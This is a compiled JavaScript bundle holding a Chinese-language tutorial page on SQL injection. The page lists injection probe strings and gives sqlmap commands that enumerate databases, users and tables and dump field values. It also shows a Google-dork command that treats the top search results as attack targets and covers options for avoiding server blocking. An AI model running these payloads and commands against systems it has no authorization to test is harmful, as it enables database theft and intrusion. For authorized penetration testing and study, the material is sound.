"use strict";(self.webpackChunkcs_guide=self.webpackChunkcs_guide||[]).push([[88705],{65585:(e,l,i)=>{i.r(l),i.d(l,{data:()=>n});const n=JSON.parse('{"key":"v-3de8289a","path":"/linux-tutor/server/kali-linux-settings/kali-linux-sql-injection.html","title":"SQL 注入","lang":"zh-CN","frontmatter":{"summary":"SQL 注入 探测到底是不是通过拼接字符串方式使用 SQL 常用字符：; sqlmap 分析数据库和表名、dump 表数据 sqlmap 介绍 目前做 SQL 注入的工具一般大家都是选择：sqlmap; 目前（2018年08月）只支持：2.6.x 和 2.7.x; 支持的 5 种注入类型：; 基于布尔的盲注，即可以根据返回页面判断条件真假的注入。; 基于时间","head":[["meta",{"property":"og:url","content":"https://yzqdev.github.io/cs-guide/cs-guide/linux-tutor/server/kali-linux-settings/kali-linux-sql-injection.html"}],["meta",{"property":"og:site_name","content":"cs-guide"}],["meta",{"property":"og:title","content":"SQL 注入"}],["meta",{"property":"og:type","content":"article"}],["meta",{"property":"og:updated_time","content":"2022-06-04T21:01:43.000Z"}],["meta",{"property":"og:locale","content":"zh-CN"}],["meta",{"property":"article:modified_time","content":"2022-06-04T21:01:43.000Z"}]]},"excerpt":"","headers":[{"level":2,"title":"探测到底是不是通过拼接字符串方式使用 SQL","slug":"探测到底是不是通过拼接字符串方式使用-sql","children":[]},{"level":2,"title":"sqlmap 分析数据库和表名、dump 表数据","slug":"sqlmap-分析数据库和表名、dump-表数据","children":[]},{"level":2,"title":"分析登录后台入口","slug":"分析登录后台入口","children":[]},{"level":2,"title":"资料","slug":"资料","children":[]}],"git":{"createdTime":1653615455000,"updatedTime":1654376503000,"contributors":[{"name":"yzqdev","email":"yzqdev@outlook.com","commits":2}]},"readingTime":{"minutes":3.42,"words":1027},"filePathRelative":"linux-tutor/server/kali-linux-settings/kali-linux-sql-injection.md","localizedDate":"2022年5月27日"}')},55781:(e,l,i)=>{i.r(l),i.d(l,{default:()=>q});var n=i(66252);const a=(0,n.uE)('<h1 id="sql-注入" tabindex="-1"><a class="header-anchor" href="#sql-注入" aria-hidden="true">#</a> SQL 注入</h1><h2 id="探测到底是不是通过拼接字符串方式使用-sql" tabindex="-1"><a class="header-anchor" href="#探测到底是不是通过拼接字符串方式使用-sql" aria-hidden="true">#</a> 探测到底是不是通过拼接字符串方式使用 SQL</h2><ul><li>常用字符：</li></ul><div class="language-text ext-text line-numbers-mode"><pre class="language-text"><code>&#39;\n&quot;\n&#39; and 1=1\n&#39; and 1=2\n1 or 1=1\n1&#39; or &#39;1&#39;=&#39;1\n1&quot; or &quot;1&quot;=&quot;1\n1&#39; order by 1--\nunion select 1,2--\n@@version\n@@datadir\nuser()\ndatabase()\ninformation_schema.tables\n\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="sqlmap-分析数据库和表名、dump-表数据" tabindex="-1"><a class="header-anchor" href="#sqlmap-分析数据库和表名、dump-表数据" aria-hidden="true">#</a> sqlmap 分析数据库和表名、dump 表数据</h2><h4 id="sqlmap-介绍" tabindex="-1"><a class="header-anchor" href="#sqlmap-介绍" aria-hidden="true">#</a> sqlmap 介绍</h4>',6),d=(0,n.Uk)("目前做 SQL 注入的工具一般大家都是选择："),s={href:"http://sqlmap.org/",target:"_blank",rel:"noopener noreferrer"},r=(0,n.Uk)("sqlmap"),t=(0,n._)("ul",null,[(0,n._)("li",null,"目前（2018年08月）只支持：2.6.x 和 2.7.x")],-1),u=(0,n._)("li",null,[(0,n.Uk)("支持的 5 种注入类型： "),(0,n._)("ul",null,[(0,n._)("li",null,"基于布尔的盲注，即可以根据返回页面判断条件真假的注入。"),(0,n._)("li",null,"基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。"),(0,n._)("li",null,"基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。"),(0,n._)("li",null,"联合查询注入，可以使用union的情况下的注入。"),(0,n._)("li",null,"堆查询注入，可以同时执行多条语句的执行时的注入。")])],-1),o=(0,n.uE)('<h4 id="sqlmap-使用" tabindex="-1"><a class="header-anchor" href="#sqlmap-使用" aria-hidden="true">#</a> sqlmap 使用</h4><ul><li>sqlmap 的输出信息按从简到繁共分为7个级别，依次为 0 ~ 6，级别越高，检测越全面。分别代表： <ul><li>使用参数 <code>-v &lt;级别&gt;</code> 来指定某个等级，默认输出级别为 1</li></ul></li></ul><div class="language-text ext-text line-numbers-mode"><pre class="language-text"><code>0：只显示 Python 的 tracebacks 信息、错误信息 [ERROR] 和关键信息 [CRITICAL]；\n1：同时显示普通信息 [INFO] 和警告信息[WARNING]；\n2：同时显示调试信息[DEBUG]；\n3：同时显示注入使用的攻击荷载；\n4：同时显示 HTTP 请求；\n5：同时显示 HTTP 响应头；\n6：同时显示 HTTP 响应体。\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ul><li>将 Google 搜索前一百个结果作为攻击目标：<code>sqlmap -g &quot;inurl:\\&quot;.asp?id=1\\&quot;&quot;</code></li><li>检查注入点（GET）：<code>sqlmap -u 目标网址</code></li><li>检查注入点（POST 数据，多个数据用分号隔开）：<code>sqlmap -u 目标网址 --data=&quot;id=0;name=werner&quot; --param-del=&quot;;&quot;</code></li><li>检查注入点（Cookie，等级必须是 2 以上）：<code>sqlmap -u 目标网址 --cookie –level 2 &quot;JSESSIONID=123456;NAME=youmeek;&quot; --cookie-del=&quot;;&quot;</code></li><li>获取所有数据库信息：<code>sqlmap -u 目标网址 --dbs</code></li><li>获取所有数据库用户：<code>sqlmap -u 目标网址 --users</code></li><li>获取当前数据库信息：<code>sqlmap -u 目标网址 --current-db</code></li><li>获取当前用户：<code>sqlmap -u 目标网址 --current-user</code></li><li>获取当前数据库和当前用户：<code>sqlmap -u 目标网址 --current-db --current-user</code></li><li>获取有几张表：<code>sqlmap -u 目标网址 --tables</code></li><li>获取指定表的字段有哪些：<code>sqlmap -u 目标网址 -T 表名 --columns</code></li><li>获取指定表字段值：<code>sqlmap -u 目标网址 -T 表名 -C 字段名1,字段名2,字段名3 --dump</code></li><li>获取指定表字段所有值：<code>sqlmap -u 目标网址 -T 表名 -C 字段名1,字段名2,字段名3 --dump-all</code></li><li>让 HTTP 请求之间添加延迟，添加参数：<code>--delay 3</code>，单位是秒</li><li>设置超时时间，默认是 30 秒，添加参数：<code>--timeout 50</code>，单位是秒</li><li>设置超时后最大重试次数，默认是 3 次，添加参数：<code>--retries 5</code></li><li>避免错误请求过多而被屏蔽：</li></ul><div class="language-text ext-text line-numbers-mode"><pre class="language-text"><code>有时服务器检测到某个客户端错误请求过多会对其进行屏蔽，而 sqlmap 的测试往往会产生大量错误请求，为避免被屏蔽，可以时不时的产生几个正常请求以迷惑服务器。有以下四个参数与这一机制有关：\n\n--safe-url: 隔一会就访问一下的安全 URL\n--safe-post: 访问安全 URL 时携带的 POST 数据\n--safe-req: 从文件中载入安全 HTTP 请求\n--safe-freq: 每次测试请求之后都会访问一下的安全 URL\n\n这里所谓的安全 URL 是指访问会返回 200、没有任何报错的 URL。相应地，Sqlmap 也不会对安全 URL 进行任何注入测试。\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ul><li>其他常用参数： <ul><li>构造随机 user-agent：<code>–random-agent</code></li><li>指定 HTTP Referer头：<code>–referer=设定值</code></li><li>换行分开，加入其他的HTTP头：<code>–headers=设定值</code></li><li>忽略响应的 Set–Cookie 头信息：<code>–drop-set-cookie</code></li></ul></li></ul><h2 id="分析登录后台入口" tabindex="-1"><a class="header-anchor" href="#分析登录后台入口" aria-hidden="true">#</a> 分析登录后台入口</h2><ul><li>nikto</li></ul><h2 id="资料" tabindex="-1"><a class="header-anchor" href="#资料" aria-hidden="true">#</a> 资料</h2>',9),c={href:"http://www.cnblogs.com/hongfei/p/3872156.html",target:"_blank",rel:"noopener noreferrer"},m=(0,n.Uk)("http://www.cnblogs.com/hongfei/p/3872156.html"),v={href:"https://www.tr0y.wang/2018/03/21/SQLmap/index.html",target:"_blank",rel:"noopener noreferrer"},p=(0,n.Uk)("https://www.tr0y.wang/2018/03/21/SQLmap/index.html"),h={},q=(0,i(83744).Z)(h,[["render",function(e,l){const i=(0,n.up)("ExternalLinkIcon");return(0,n.wg)(),(0,n.iD)("div",null,[a,(0,n._)("ul",null,[(0,n._)("li",null,[d,(0,n._)("a",s,[r,(0,n.Wm)(i)]),t]),u]),o,(0,n._)("ul",null,[(0,n._)("li",null,[(0,n._)("a",c,[m,(0,n.Wm)(i)])]),(0,n._)("li",null,[(0,n._)("a",v,[p,(0,n.Wm)(i)])])])])}]])}}]);